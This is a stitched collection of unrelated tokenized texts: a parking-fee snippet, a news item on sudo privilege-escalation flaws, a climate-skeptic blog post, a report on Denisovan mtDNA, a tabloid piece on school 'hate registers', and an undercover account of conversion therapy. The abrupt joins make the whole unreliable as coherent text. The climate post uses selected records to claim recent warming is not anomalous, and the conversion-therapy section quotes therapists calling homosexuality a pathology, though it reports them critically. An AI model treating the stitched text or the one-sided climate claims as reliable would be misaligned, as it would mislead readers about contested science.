Both Stamford and New York could follow the example of Palo Alto , California , which allows developers to pay fees “ in lieu ” of required parking .
Those fees could be used for public investments like widening the crowded Flushing sidewalks , or the unfunded sections of Stamford ’s Urban Transitway .
Several Linux distributors have released updated sudo packages to fix two vulnerabilities that allow users with limited access rights to escalate their privileges .
The sudo ( super user do ) command is intended to allow users to execute certain commands at another user 's privilege level - usually root .
The contents of the /etc / sudoers file determines whether or not a user is authorised to execute a command at a higher privilege level ( by preceding the command with sudo ) without further authentication .
This allows administrators to give other users the rights required to handle certain management tasks without giving them overall root access .
The tasks can , for instance , include managing a file ; for this purpose , sudo offers added functions called pseudo commands such as sudoedit for file editing .
However , this function can reportedly be exploited by attackers to execute an identically named file in the home directory ( and other directories ) of the user who has root access – and this file can , in turn , contain arbitrary commands .
Further implementation flaws are contained in the runas_default option , which potentially also grants root access .
Administrators can set the user context for command execution to that of another user rather than root in /etc / suoders .
This is intended to save users having to add the ( sudo ) -u username option to their command .
However , the programming flaw causes sudo to set the group privileges not for the stated user , but to root instead .
The flaw is inconsequential in standard installations because runas_default is n't usually enabled there .
The official version of sudo is also unaffected .
The updated version , 1.7.2 p4 , fixes the flaw in sudoedit .
The stable version has since been updated to version 1.7.2 p5 ( direct download ) to fix two other bugs .

Guest Post by Willis Eschenbach
[ see Updates at the end of this post ]
Science is what we use to explain anomalies , to elucidate mysteries , to shed light on unexplained occurrences .
For example , once we understand how the earth rotates , there is no great need for a scientific explanation of the sun rising in the morning .
If one day the sun were to rise in the afternoon , however , that is an anomaly which would definitely require a scientific explanation .
But there is no need to explain the normal everyday occurrences .
We do n’t need a new understanding if there is nothing new to understand .
Hundreds of thousands of hours of work , and billions of dollars , have been expended trying to explain the recent variations in the climate , particularly the global temperature .
But in the rush to find an explanation , a very important question has been left unasked :
Just exactly what unusual , unexpected temperature anomaly are we trying to explain ?
The claim is made over and over that humans are having an effect on the climate .
But where is the evidence that there is anything that even needs explanation ?
Where is the abnormal phenomenon ?
What is it that we are trying to make sense of , what is the unusual occurrence that requires a novel scientific explanation ?
There are not a lot of long - term temperature records that can help us in this regard .
The longest one is the Central England Temperature record ( CET ) .
Although there are problems with the CET ( see Sources below ) , including recent changes in the stations used to calculate it that have slightly inflated the modern temperatures , it is a good starting point for an investigation of whether there is anything happening that is abnormal .
Here is that record :
Figure 1 . The Central England Temperature Record .
Blue line is the monthly temperature in Celsius .
Red line is the average temperature .
Jagged black line is the 25 - year trailing trend , in degrees per century .
Now , where in that record is there anything which is even slightly abnormal ?
Where is the anomaly that the entire huge edifice of the AGW hypothesis is designed to elucidate ?
The longest sustained rise is from about 1680 to 1740 .
That time period also has the steepest rise .
The modern period , on the other hand , is barely above the long - term trend despite urban warming .
There is nothing unusual about the modern period in any way .
OK , so there ’s nothing to explain in the CET .
How about another long record ?
One of the world ’s best single station long - term records is that of the Armagh Observatory in Ireland .
It has been maintained with only a couple minor location changes for over 200 years .
Figure 2 shows the Armagh record .
Figure 2 . Temperature record for Armagh University .
Various colored lines as in Figure 1 .
We find the same thing in this record as in the CET .
The fastest rise was a long , long time ago .
The modern rise is once again insignificant .
Where in all of this is anything that requires billions of dollars to explain ?
Finally , what about the global record ?
Here , you do n’t have to take my word for it .
A much chastened Phil Jones ( the disgraced former Director of the CRU of email fame ) , in an interview with the BBC on Friday , February 12 , 2010 , answered a BBC question as follows :
Do you agree that according to the global temperature record used by the IPCC , the rates of global warming from 1860 - 1880 , 1910 - 1940 and 1975 - 1998 were identical ?
An initial point to make is that in the responses to these questions I ’ve assumed that when you talk about the global temperature record , you mean the record that combines the estimates from land regions with those from the marine regions of the world .
CRU produces the land component , with the Met Office Hadley Centre producing the marine component .
Temperature data for the period 1860 - 1880 are more uncertain , because of sparser coverage , than for later periods in the 20th Century .
The 1860 - 1880 period is also only 21 years in length .
As for the two periods 1910 - 40 and 1975 - 1998 the warming rates are not statistically significantly different ( see numbers below ) .
I have also included the trend over the period 1975 to 2009 , which has a very similar trend to the period 1975 - 1998 .
So , in answer to the question , the warming rates for all 4 periods are similar and not statistically significantly different from each other .
So in fact , according to Phil Jones ( who strongly believes in the AGW hypothesis ) there is nothing unusual about the recent warming either .
It is not statistically different from two earlier modern periods of warming .
Since these warming periods were before the modern rise in CO2 , greenhouse gases cannot have been responsible for those rises .
So my question remains unanswered … where is the anomaly ?
Where is the unusual occurrence that we are spending billions of dollars trying to explain ?
The answer is , there is no unusual warming .
There is no anomaly .
There is nothing strange or out of the ordinary about the recent warming .
It is in no way distinguishable from earlier periods of warming , periods that we know were not due to rising CO2 .
There is nothing in the record that is in any way different from the centuries - long natural fluctuations in the global climate .
In other words , we have spent billions of dollars and wasted years of work chasing a chimera , a will - of - the - wisp .
This is why none of the CO2 explanations have held water … simply because there is nothing unusual to explain .

JONES BBC INTERVIEW : http://news.bbc.co.uk/2/hi/science/nature/8511670.stm
Jones also makes the interesting argument in the interview that the reason he believes that recent warming is anthropogenic ( human - caused ) is because climate models can’t replicate it … in other words , he has absolutely no evidence at all , he just has the undeniable fact that our current crop of climate models can’t model the climate .
Seems to me like that ’s a problem with the models rather than a problem with the climate , but hey , what do I know , I was born yesterday …
[ UPDATE 1 ]
Further evidence that nothing abnormal is happening is given by the individual US state record high temperatures .
Here are the number of US state record high temperatures per decade , from the US National Climate Data Center ( NCDC ) :
Figure 3 . US state high temperature records , by decade .
In the period 1930 - 1940 , twenty of the fifty US states had their highest recorded temperature .
As you can see , the recent decades have not had record - beating high temperatures , nor are they unusual or abnormal in any way .
Nearly half of the high temperature records were set back in the 1930 - 1940 decade .
[ UPDATE 2 ]
Here is another look at the lack of any abnormalities in climate data .
I will add more as they come up .
This is data on snow extext , from the Rutgers University Global Snow Lab :
Figure 4 . Snow cover variation , Northern Hemisphere .
Transparent blue line shows the month - by - month cover , and the red line is the average snow cover .
So , nothing to see here .
There is no evidence that the climate has gone off course .
There is no evidence of the claimed reduction in snow cover which is supposed to provide a positive feedback to warming .
In fact , the surprising thing is how little the snow cover has changed over the last forty years .
[ UPDATE 3 ]
We often hear about the vanishing polar sea ice .
Usually , however , people only look at half of the picture , Arctic sea ice .
Although you would n’t know it from the scare stories , we do have a South Pole .
Here is the record of global sea ice , 1979 - 2006
Figure 5 . Global ice area variation .
Blue line shows the month - by - month area , and the red line is the average area .
DATA SOURCE
This illustrates the non-intuitive nature of climate .
As the global temperature was climbing from 1985 until 1998 , global sea ice was increasing .
Since then it has decreased , and currently is where we were at the start of the satellite record .
Variation in the average is ± 2 % .
Nothing unusual here .
[ UPDATE 4 ]
Another oft - mentioned item is tropical cyclones .
Here is the record of Accumulated Cyclone Energy , for both the Globe and and Northern Hemisphere , from Ryan Maue .
Figure 6 . Accumulated Cyclone Energy .
Upper line is global , lower line is Northern Hemisphere .
Area between lines is Southern Hemisphere
As you can see , there is nothing out of the ordinary in the accumulated cyclone energy either .
It goes up … it comes down .
Nature is like that .
[ UPDATE 5 ]
Arctic temperatures are often cited as being anomalous .
Here ’s the record for Alaska ;
Figure 7 . Alaska Temperature Average from First Order Observing Stations .
DATA SOURCE .
The Alaskan temperature is regulated by the Pacific Decadal Oscillation ( PDO ) .
The PDO shifted from the cool phase to the warm phase around 1976 [ typo corrected , was incorrectly listed as 1986 ] , and has recently switched back to the cool phase .
As you can see , other than the step changes due to the PDO , there is little variation in the Alaska temperatures .
[ UPDATE 6 ]
There has been much discussion of the effect of rising temperatures on rainfall .
Here is the CRU TS3 global precipitation record :
Figure 8 . Global Precipitation , from CRU TS3 1° grid .
DATA SOURCE
As in all of the records above , there is nothing at all anomalous in the recent rainfall record .
The average varies by about ± 2 % .
There is no trend in the data .
[ UPDATE 7 ]
People keep claiming that hurricanes ( called “ cyclones ” in the Southern Hemisphere ) have been rising .
They claim that damage from hurricanes in the US have been going up .
Here is data on hurricane damage :
The figure above shows normalized US hurricane losses for 1900 to 2009 .
It shows an estimate of what hurricane damages would be if each hurricane season took place in 2009 .
The dark line shows the linear best fit from Excel .
Obviously , there is no trend .
This makes sense as there has also been no trend in U.S. landfall frequencies or intensities over this period ( in fact , depending on start date there is evidence for a slight but statistically significant decline , source in PDF ) .
In addition , a new WMO study in Nature ( subscription required ) says ( emphasis mine ) :
In terms of global tropical cyclone frequency , it was concluded that there was no significant change in global tropical storm or hurricane numbers from 1970 to 2004 , nor any significant change in hurricane numbers for any individual basin over that period , except for the Atlantic ( discussed above ) .
Landfall in various regions of East Asia26 during the past 60 years , and those in the Philippines during the past century , also do not show significant trends .
[ UPDATE 8 ]
You ’d think , from all of the shouting about the greenhouse radiation , that we would have seen some change in it over the last few decades .
Here is NOAA data on average outgoing ( from the earth to space ) longwave ( greenhouse ) radiation ( OLR ) .
Figure 10 .
Global Outgoing Longwave Radiation .
NOAA Interpolated OLR
Change in the average OLR over the period of record is less than ± 1 % , and change since 1980 is only ± 0.5 % .
The current average value is the same as in 1976 .
[ UPDATE 9 ]
OK , how about droughts ?
After all , droughts are supposed to be one of the terrible things that accompany warming , and the earth has warmed over the last century .
Here ’s the Palmer Drought Severity Index for that time span , 1901 - 2002 :
Once again , despite going up some and down some , we ’ve ended up just where we started .
[ UPDATE 10 ]
More on the Arctic .
From Polyakov et al . , we have this :
Figure 12 .
Arctic Temperature Anomaly .
DATA SOURCE
The study used temperature stations from all around the shore of the Arctic Ocean , plus buoys and ice stations .
It covered the area north of the Arctic Circle , that is to say the entire Arctic .
This matches an analysis I did last year of the Nordic countries .
Here is a result from that study .
Figure 13 .
Nordic Land Temperature Anomaly .
Original caption says “ I used the NORDKLIM dataset available here .
I removed the one marine record from “ Ship M ” .
To avoid infilling where there are missing records , I took the “ first difference ” of all available records for each year and averaged them .
Then I used a running sum to calculate the average anomaly .
I did not remove cities or adjust for the Urban Heat Island ( UHI ) effect . ”
Note that , as we would expect , the temperature of the Nordic Countries is similar to that of the Arctic as a whole .
This adds confidence to the results .
I show the trends for the same intervals as in Fig. 12 .
Again , there is nothing out of the ordinary here .
The recent Arctic warming is often held up as evidence for human influence on the climate .
The data shows the Arctic warming from 1902 - 1938 was longer and stronger than the recent warming .
There is nothing for CO2 to explain .
[ UPDATE 11 ]
More on storms .
We ’ve looked at cyclones , but what about storms in the temperate zones ?
Here are the results from a More on storms .
We ’ve looked at cyclones , but what about storms in the temperate zones ?
Here are the results from a study ( pay per view ) by Bärring and Fortuniak called Multi-indices analysis of southern Scandinavian storminess 1780 - 2005 and links to interdecadal variations in the NW Europe - North Sea region .
Here ’s one of their graphs :
Figure 14 .
Changes in storms in Lund and Stockholm , Sweden .
Increasing values shows increasing storms .
About this graph , the authors say :
(1) There is no significant overall long - term trend common to all indices in cyclone activity in the North Atlantic and European region since the Dalton minimum .
( 2 ) The marked positive trend beginning around 1960 ended in the mid-1990s and has since then reversed .
This positive trend was more an effect of a 20th century minimum in cyclone activity around 1960 , rather than extraordinary high values in 1990s .
Both the 1960s minimum and the 1990s maximum were within the long - term variability .
( 3 ) Because the period between the 1960s minima and the 1990s maxima spans a substantial part of the period covered by most reanalysis datasets , any analysis relying solely on such data is likely to find trends in cyclone activity and related measures .
Ca n’t be much clearer than that .
There ’s no change in North Atlantic storminess .
[ UPDATE 12 ]
More on rainfall , this time extreme rainfall and floods .
I took the data from Trend detection in river flow series : 1 . Annual maximum flow , and used it to compare record river flows by decade .
Here are those results :
Figure 15 .
Maximum River Flow Index for US , European , and Australian rivers .
The math on this one was more complex than the record state temperatures .
The river records are of different lengths , and they do n’t span the same time periods .
Of course , this affects the odds of getting a record in a given year .
For example , if a river record is say only ten years long , the random chance of any year being the maximum is one in ten .
For the longest record in the dataset above , it is one in 176 .
In addition , the number of river records available in any year varies .
To adjust for these differences , I took the odds of the record not being set in that particular year for each stream .
This is ( 1 – 1 / record length ) .
I multiplied together all of those ( 1 - 1/ len ) odds for all the records available in that year to give me an overall odds of that year not being a record .
Finally , I took the average of those overall odds for the decade , and multiplied it by the actual count of records in that year .
This gave me the maximum river flow index shown above .
If there were lots of short records in a given decade , we ’d be more likely to get a record by chance , so the record count in that decade is accordingly reduced .
On the other hand , if there were only a few long records in that decade , there ’s not much chance of a record being set randomly in that decade , so the count would be reduced less .
As you can see , there is no sign of a recent increase in the adjusted number of records .
Or as the authors of the study say :
The analysis of annual maximum flows does not support the hypothesis of ubiquitous growth of high flows .
Although 27 cases of strong , statistically significant increase were identified by the Mann - Kendall test , there are 31 decreases as well , and most ( 137 ) time series do not show any significant changes ( at the 10 % level ) .
Once again , we see no sign of the changes in climate predicted by the UN IPCC .
What were the changes they predicted ?
Figure 16 .
Observed and Projected Changes from the UN IPCC Third Assessment Report .
As you can see above , there is no increase in extreme drought , precipitation , extreme high temperatures , or cyclone events .
[ UPDATE 13 ]
Oh , yeah , a pet peeve of mine .
You know how they always say “ Yeah , but nine out of the last ten years have been among the ten warmest years of the record ” , as though that proved that the last ten years was an unusual , anomalous time ?
The trouble with this argument is that in a time of rising temperatures , that is often true .
The temperature is rising , so where would you expect the warmest years to be ?
How often is it true ?
Thanks for asking , here ’s the data from the GISS temperature record .
Figure 16 .
Number of “ Top Ten ” years in the GISS global temperature record up to that point that occurred in the ten years previous to a given year .
So yes , nine of the last ten years were in the top ten years in the record … but that was true three times in the 1940’s .
So once again , there is nothing unusual about the recent warming .
[ Edited to Add ] I got to thinking about the IPCC WG1 report , which is the science report .
People always claim that it contains nothing but science , and none of it has been overthrown .
So I pulled up the Summary for Policymakers .
Under the second section , called “ Direct Observations of Climate Change ” , the very first item says ( emphasis mine ) :
Eleven of the last twelve years ( 1995 –2006 ) rank among the 12 warmest years in the instrumental record of global surface temperature9 ( since 1850 ) .
The updated 100 - year linear trend ( 1906 to 2005 ) of 0.74 °C [ 0.56 °C to 0.92 °C ] is therefore larger than the corresponding trend for 1901 to 2000 given in the TAR of 0.6 °C [ 0.4 °C to 0.8 °C ] .
Since the claim was slightly different than the one I analyzed above , I went back and looked at the top twelve .
Here they are :
Figure 17 .
Number of “ Top Twelve ” years in the GISS global temperature record up to that point that occurred in the twelve years previous to a given year .
Once again , nothing unusual … yes , the earth has been warming , but not in any unusual or anomalous way .
Next , there is no “ therefore ” in the comparison of the trends .
The mere fact that a number of the warmest years were in the last 12 does not guarantee an increase in the trend .
If the post 2000 trend continued to increase regularly and very slightly , there would always be 12 of the warmest years in the last 12 … but the 100 year trend would steadily decrease .
[ UPDATE 14 ]
The predicted acceleration of sea level rise is one of the favorites of those who want to scare people about CO2 .
Since 1992 , sea level has been measured by satellite .
Here is the record of sea level rise over that period :

The satellite measures the sea level rise using radar .
DATA SOURCE
As you can see , rather than accelerating , sea level rise has been slowing down for the past few years .
Another inconvenient truth …
[ UPDATE 15 ]
Extreme weather events are a perennial favorite among the forecast ills from purported climate change .
I found good data on the maximum three day rainfall totals for eight areas on the US Pacific Coast .
The areas are Western Washington , Northwest Oregon , Southwest Oregon , Northwest California , North Central California , West Central California , Southwest California , and Southern California .
For each record , I ranked the results , and averaged them across the 8 records .
This gave me a ranking index showing which years had the most extreme events over the entire region .
Fig. 19 shows the results , with larger numbers showing higher ranked years ( those with more extreme rainfall events ) .
Figure 19 .
Extreme rainfall events , averaged over eight US Pacific Coast climate zones DATA SOURCE
As you can see , there is nothing unusual in the data .
The number of extreme events has n’t changed much over the period , and there is no long - term trend .

For much of the past five million to seven million years over which humans have been evolving , multiple species of our forebears co-existed .
But eventually the other lineages went extinct , leaving only our own , Homo sapiens , to rule Earth .
Scientists long thought that by 40,000 years ago H. sapiens shared the planet with only one other human species , or hominin : the Neandertals .
In recent years , however , evidence of a more happening hominin scene at that time has emerged .
Indications that H. erectus might have persisted on the Indonesian island of Java until 25,000 years ago have surfaced .
And then there 's H. floresiensis — the mini human species commonly referred to as the hobbits — which lived on Flores , another island in the Indonesian archipelago , as recently as 17,000 years ago .
Now researchers writing in the journal Nature report that they have found a fifth kind of hominin that may have overlapped with these species .
( Scientific American is part of Nature Publishing Group . )
But unlike all the other known members of the human family , which investigators have described on the basis of the morphological characteristics of their bones , the new hominin has been identified solely on the basis of its DNA .
Johannes Krause and Svante Pääbo of the Max Planck Institute for Evolutionary Anthropology in Leipzig , Germany , and their colleagues obtained the DNA from a fossilized pinky finger bone found at Denisova Cave in the Altai Mountains of southern Siberia .
The species was impossible to determine from the shape and size of the bone — it simply did not contain any diagnostic morphological traits .
But there were good reasons to believe it came from a Neandertal or an early modern human .
For one , the bone was recovered from a stratigraphic layer of the cave dated to between 50,000 and 30,000 years ago that contained artifacts belonging to the so - called Middle Paleolithic and Upper Paleolithic industries associated with these two groups .
For another , Neandertals and modern humans were the only hominins known to have lived in this region during that time period .
But the DNA the team extracted from the Denisova pinky bone turned out to be markedly different from DNA sequences previously obtained from early modern humans and Neandertals .
The researchers focused on a type of DNA known as mitochondrial DNA ( mtDNA ) .
Mitochondria are the power plants of the cell , and they have their own DNA that is separate from that housed in the cell nucleus and is passed down from mother to offspring .
Because each cell has thousands of mitochondria , but only a single nucleus , mitochondrial DNA is much more abundant than nuclear DNA and is therefore more likely than the latter to be preserved in fossilized bone .
To date , scientists have sequenced the mitochondrial genomes of both Neandertal and early modern human individuals , and the sequences for the two groups are quite distinctive .
Comparing the order of the genetic " letters " — or base - pairs , as they are termed — making up the Denisova mtDNA with the sequences of modern day humans and an early modern human , Krause and his collaborators found that the Denisova mtDNA differed from humans today in nearly twice as many letter positions as Neandertal mtDNAs do .
Further analysis indicated that the most recent common mtDNA ancestor of the Denisova individual , Neandertals and modern humans dates to around a million years ago ( making it twice as old as the most recent common mtDNA ancestor of Neandertals and moderns ) .
This divergence date , the team says , indicates that the Denisova mtDNA is distinct from that of the H. erectus population that left Africa 1.9 million years ago , and also from that of the Neandertal ancestor H. heidelbergensis , which branched off from the lineage leading to modern humans around 466,000 years ago .
As such , the researchers contend the Denisova mtDNA reveals a previously unrecognized migration out of Africa by a hitherto unknown group of hominins .
( The team is holding off on giving the creature a formal name for now , but informally they refer to it as X - woman . )
" The data that they provide is certainly of the nature to arrive at the conclusions that they do , " comments Stephan Schuster of The Pennsylvania State University , who worked on the recent sequencing of Archbishop Desmond Tutu 's nuclear genome as well as the nuclear genome sequencing of a woolly mammoth .
" All the detected sequence differences clearly indicate that this is a novel variant of a [ hominin ] . "
Paleoanthropologist Ian Tattersall of the American Museum of Natural History in New York City noted that the finding should not necessarily come as a surprise .
" We know the fossil record is far from complete , but what we have already shows that the [ hominin ] evolutionary bush is quite luxuriantly branching , " he remarks .
" One more branch is not something that ought to give us indigestion . "
The association of the mystery hominin with those Middle and Upper Paleolithic artifacts is peculiar though , because elsewhere in Eurasia they have only turned up with Neandertal and modern human remains .
Krause notes that it is possible that the pinky bone originated in an older , deeper layer of the cave sediments and over time got mixed in with the overlying artifacts .
Thus far , however , there is no evidence for extensive perturbation .
Another possibility , he says , is that the finger bone is that of an early modern human who carried an ancient mtDNA as a result of interbreeding between his or her ancestors and this previously unknown hominin group .
But other experts are not so sure about the team 's interpretation of their data .
" I do n't know — and nobody else does — how many base - pair changes make a new species , " says Erik Trinkaus of Washington University in Saint Louis , an authority on Neandertals and early modern humans .
" I would like to have more than the number of mtDNA base pair differences to go on . "
" The result does n't mean that they 've found a new species , and I do n't believe it requires a separate pre-Neandertal migration out of Africa , " argues John Hawks of the University of Wisconsin–Madison , whose research focuses on human genetic evolution .
" Those explanations are both compatible with the result , but I do n’t think the data require them yet . "
Hawks notes that the history of an mtDNA sequence — which is just a tiny fraction of a person 's total DNA — does not necessarily reflect the history of a species .
A comparably distinctive nuclear genome sequence would significantly strengthen the claim that the Denisova mtDNA represents a previously unknown type of hominin .
To that end , Krause and Pääbo are launching a Denisova genome project to obtain a full nuclear genome sequence from the bone that yielded the novel mtDNA .
Comparisons of this genome with the full genome sequence they have obtained for the Neandertal as well as with the genomes of people living today could yield insights into the genetic changes that defined H. sapiens .
" At the end we get more information about the big question [ of ] what makes humans humans , " Krause reflects .
Meanwhile , paleoanthropologists are eager for more fossils to confirm the DNA - based claim .
With luck , continued excavation at Denisova cave this summer will turn up additional remains — and put a face on this long - lost relative .

Pupils aged five on hate register : Teachers must log playground taunts for Government database
Furious : Penny Drury 's ten - year - old son Peter is on the ' hate list ' for calling a friend a ' gay boy ' outside school
Heads will be forced to list children as young as five on school ' hate registers ' over everyday playground insults .
Even minor incidents must be recorded as examples of serious bullying and details kept on a database until the pupil leaves secondary school .
Teachers are to be told that even if a primary school child uses homophobic or racist words without knowing their meaning , simply teaching them such words are hurtful and inappropriate is not enough .
Instead the incident has to be recorded and his or her behaviour monitored for future signs of ' hate ' bullying .
The accusations will also be recorded in databases held by councils and made available to Whitehall and ministers to help them devise future anti-bullying campaigns .
The scale of the effort to stop children using homophobic or racist language was revealed after the parents of a ten - year - old primary school pupil in Somerset , Peter Drury , were told that his name would be put on a register and his behaviour monitored while he remained at school .
The boy was reported after he called a friend ' gay boy ' .
His parents fear the record of homophobic bullying will count against him throughout his school career and even into adulthood .
In another incident last year a six - year - old girl , Sharona Gower , was reported for ' racist bullying ' at her school near Tunbridge Wells in Kent .
Sharona was chased by two 11 - year - old girls , one of whom taunted her that she had chocolate on her face .
The six - year - old responded to one of the girls , who was black : ' Well , you 've got chocolate on yours . '
Many schools nationwide have already followed advice that they should record incidents of alleged racist , homophobic or anti-disability bullying .
One report last year by the Manifesto Club civil liberties think - tank said that 40,000 children each year are having racist charges added to their school records .
But ministers aim to make reporting of supposed ' hate taunting ' a legal requirement for every school , primary as well as secondary , and every local authority across the country from the beginning of the new school year in September .
Incidents considered serious will have to be reported to local authorities .
Children 's Secretary Ed Balls is set to introduce rules that , officials said , ' will mean that schools will have to record and report serious or recurring incidents of bullying to their local authority .
' This will include incidents of bullying and racism between pupils and abuse or bullying of school staff .
The Government is clear that schools must take seriously any complaints made of abuse or bullying by pupils . '
Schools will be expected to monitor the behaviour of individual children .
Local authority records will show incidents and their nature , but not names of pupils .
Head teachers were first advised to keep records of racist incidents eight years ago .
Then , in 2007 , heads were told to include disability - related and homophobic bullying in their tallies .
Rules for heads say that using language such as ' gay ' - which has had near - universal usage among British schoolchildren in recent years to denote something as inferior - counts as homophobic bullying , even if pupils do not have any homophobic intention in mind when using the word .
Primary school pupils must be taught ' the nature and consequences of homophobic bullying ' , according to the rules .
Schools Minister Vernon Coaker said : ' The majority of schools already record incidents of bullying .
' However , we want to make sure that all schools have measures in place to prevent and tackle bullying and show they are taking it seriously . '
But concerns have been raised that the system turns everyday banter among children into incidents of racism or homophobia when none was meant .
Margaret Morrissey , founder of campaign group Parents Outloud , said : ' This is totally appalling .
The use of such language is part of the learning process .
Children need to learn where the boundaries lie .
And I very much doubt they understand what they are saying .
' This does not mean that the behaviour should n't be challenged .
It must be explained that it is wrong .
But to keep a register that will haunt them for years to come is going far too far and is against all rights . '
Michele Elliott of the charity Kidscape said : ' Children are being criminalised and singled out here from a very early age when they do n't know what they 're doing . '
Tory MP
Ann Widdecombe said : ' Abuse in the playground has always happened and always will .
' Children have to learn to take this as part of growing up and you can't punish children for doing something they do n't understand while they are very young . '
HOW PETER DRURY WAS 'HATE LISTED '
Penny Drury was furious when her ten - year - old son Peter was put on the local education authority 's ' hate list ' after he called a friend a ' gay boy ' outside school .
Mrs Drury , 43 , was called into her son's primary school to be told by the headmaster that another mother had heard Peter using homophobic language .
She was told that the incident would be registered and his file monitored while he was at Ashcombe Primary School in Westonsuper - Mare , Somerset .
' He does n't even understand about the birds and the bees , so how can he be homophobic ? ' said Mrs Drury , pictured with Peter .
Register : Minor playground insults must be recorded as examples of serious bullying and details kept on a database ( file picture )
' Peter is a very naive boy who did n't know what he was doing and is now very upset as he is now in trouble .
It does n't mean he is going to turn into a homophobic attacker when he is older .
' He must have picked up the word from somewhere and thought it to mean stupid .
' If I heard it I would have been the first to correct him and tell him not to use it , but putting him on a register seems way over the top . '
Mrs Drury and her husband Brian , a manufacturing manager , asked for Peter to be removed from the register but to no avail .
Mrs Drury added : ' I 'm now worried if this is going to affect him applying for universities in the future .
I just think the whole thing would be better sorted out by the teacher or parent explaining to them that their language is wrong and not to do it again . '
In Britain today therapists are trying to convert gay men and women to heterosexuality .
I know this , because for several months I infiltrated this network of therapists and put myself – a happy , " out " gay man – through treatment .
According to a report by Professor Michael King of University College London , one in six UK psychiatrists and psychotherapists have sought to reduce or change a patient 's sexual orientation .
And with the help of the American conversion therapy movement , practitioners here , along with a clutch of international " conversion " organisations , are becoming co-ordinated and unified .
They plan to gain credibility , university backing and government funding .
In some cases , the NHS is even paying for the treatment .
This is despite the fact that homosexuality was removed from the Diagnostic and Statistical Manual – psychiatry 's glossary of conditions – 36 years ago .
And despite much evidence that such practices are damaging and ineffective .
My investigation began last spring , shortly after King 's report was published , when an evangelical group held a conference in a central London church for therapists wanting to learn how to " reorient " their patients .
I wanted to know who these therapists were , what happened during the treatment , and what effect it would have on the recipient .
I posed as a potential client wanting to be cured .
***
Two hulking security guards search me on my way in .
Inside , there are two large lecture halls with more than 100 delegates .
They are mostly men ; they seem subdued , waiting for the show to start .
Tables at the back of the hall display books on how to make people heterosexual .
The keynote speaker is Dr Joseph Nicolosi , an American psychologist and the author of some of the movement 's core texts .
He is the founder of the National Association for Research and Therapy of Homosexuality ( NARTH ) , one of the biggest international conversion organisations .
He has a cropped beard and wears a crisp suit .
" Homosexual behaviour is always prompted by loneliness , " he tells the rapt audience with big gestures and a dramatic voice , " It 's a pathology , a struggle to connect with the male identity . "
His thesis is faintly Freudian : a distant father and an overbearing mother create deep wounds in a child , which lead to homosexuality .
He speaks about the work at his own Californian conversion clinic .
" We advise fathers , ' If you do n't hug your sons , some other man will . '
We train the mothers to back off . ' "
During the lunch break gay protesters gather outside the venue , kept back by a police cordon .
I can hear the din of the chanting and the whistle - blowing .
The organisers advise us to stay inside .
I approach a psychiatrist , David , who had earlier asked a question from the floor , to see if he will treat me for my homosexuality .
David tells me he runs a clinic which helps men " reach their heterosexual potential " .
He wo n't treat lesbians .
" I have resolved my own sexuality , " he says , explaining that he is now married with children , and gives me his business card : it reads , " I took the road less travelled . "
David points out a female psychotherapist who also practices conversion therapy , so I go over and introduce myself – I call myself Matthew .
She looks homely and her hair is greying .
Her name is Lynne .
She too gives me her business card .
She is a fully accredited member of the British Association of Counsellors and Psychotherapists ( BACP ) , the largest of the psychotherapy bodies .
After the conference I look David up online .
As I 'm researching his practice and qualifications , I see a reference to Iris Robinson , the scandal - stricken Ulster MP who in 2008 famously compared homosexuality to child abuse .
In an interview with the BBC , she mentioned she knew a " lovely psychiatrist " who " tries to help homosexuals to run away from what they are engaged in . "
For the next step in my " treatment " , I contact David and Lynne to arrange one - on - one sessions .
***
I have a dictaphone taped to my stomach as I arrive at Lynne 's large house , north of London .
She had told me beforehand that she would charge me £ 40 per session and that she always prayed at the beginning and end of the sessions .
I 'm shown into a spacious living room .
" I love my work and in particular this whole area of SSA [ same sex attraction ] , " she says , as we sit down .
" It 's such an important area to work in . "
She has a wholesome face and the suburban air of someone who , when not trying to convert you to heterosexuality , would probably be rustling up a jolly good Victoria sponge .
Like those at the conference , she does n't say " gay " ; she only uses the term " SSA " .
I ask how she views homosexuality – as a mental illness , an addiction or an anti-religious phenomenon ?
" It 's all of that , " she replies .
And then we pray .
" Oh Father , we give you permission to work in Matthew 's life to bring complete light and healing into every part of his being . "
After asking God to heal me , she opens her eyes .
" I know the boundaries to keep within , " she says .
She begins by asking me about my psychological history .
I tell her that I was depressed as a teenager because I feared I would face prejudice for the rest of my life .
Can I learn to not feel attraction to men ?
" Yes , " she replies , " because that attraction is connected to a deep need that needs to be met and responded to and healed . "
But how do I instead become attracted to women ?
Lynne explains that it 's about " reprogramming " and going back into my early developmental stages .
" Parts of you have developed but there is a little part of you that has stayed stuck , " she says .
Oh , like being retarded ?
" It is a bit like that , " she agrees .
Lynne asks why I have come for treatment .
I tell her that I 'm tired of meaningless sexual encounters and that I have rediscovered my faith .
She gets a whiteboard out and starts writing my words up on it .
" I can't deal with the meaningless anymore , " she says as she scrawls .
" Hmm. Good sentiment . "
" Are you feeling quite lustful with the SSA ? " she asks .
I reply that I am – but not just lust .
In my last relationship , I say , I felt profound love towards my boyfriend .
" That needs to be broken , " she says .
" There 's a darkness that 's very real that keeps you as its dog , but of course our God is more powerful than that . "
Lynne 's approach is two - pronged .
She gives practical advice to intercept my sexual feelings towards men and , in keeping with Nicolosi 's theories , delves into my past to search for my " wounds " .
These , she says , will explain why I turned to homosexuality .
She begins her wound hunt by asking about my family .
I tell her that I have a close relationship with my parents and that they always gave me huge amounts of love , so I did n't understand why Nicolosi says that homosexuality is caused by inadequate parenting .
" Well , there was something happening within your family dynamics that led to your depression , " she says .
Lynne explains that people only identify as gay when they are already depressed .
" There 's a confusion , there 's an anxiety , there 's a lot of pain , " she says .
" Often the thought can be , ' Oh I 'm confused about my sexuality so I must be gay ' . "
She says that at the heart of homosexuality is a " deep isolation " , which is , she says , " where God needs to be " .
" Did you have a difficult birth ? " she asks .
No , I say .
Why ?
" It 's just something I have noticed .
Often [ with homosexuality ] it is quite traumatic , the baby was put into intensive care and because of the separation from the mother there can be that lack of attachment . "
She moves on .
" Any Freemasonry in the family ? "
No , I say , again asking her to elaborate .
" Because that often encourages it as well .
It has a spiritual effect on males and it often comes out as SSA . "
Next , she looks for self - esteem wounds .
" I think you have some unhelpful thoughts about yourself , about who you are , " she says .
" What do you think about yourself ?
In the deepest part of you , in your stomach . "
" I think I 'm a good person , " I reply .
She wants more .
" I think I am a determined person . "
Still not enough .
" I think I 've a lot to give . "
" But do you like yourself ? " she asks , becoming impatient .
" I think I 'm a good person , " I repeat .
" Yes that 's different though from ' do you like yourself ? '
Deep underneath this there 's other stuff we need to get to .
I think you must have had quite a lot of bullying . "
No , I say .
" There was no sexual abuse ? " she asks , leaning in and squinting again .
